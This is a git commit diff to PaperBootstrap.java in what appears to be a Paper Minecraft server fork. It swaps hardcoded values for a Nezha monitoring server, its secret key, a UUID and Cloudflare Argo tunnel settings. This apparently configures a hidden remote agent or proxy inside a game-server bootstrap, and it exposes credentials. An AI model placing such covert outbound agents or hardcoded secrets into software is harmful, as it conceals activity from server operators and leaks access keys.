0be7e2781ba834866c3857a7d75021cfa88adaf4
12280git <git@12280.dpdns.org>
2025-11-10 15:04:30 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,11 +92,11 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "e69aac04-aab7-4b93-8432-7a0f8ee442ca");
+        envVars.put("UUID", "ac54adc9-738f-4982-a377-fcadff452026");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "nz.gkkk.eu.org");
-        envVars.put("NEZHA_PORT", "5555");
-        envVars.put("NEZHA_KEY", "1AxTRAWuTQ1oD0LZEJ");
+        envVars.put("NEZHA_SERVER", "fastmeo.eu.org:8008");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "Nightelf123");
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
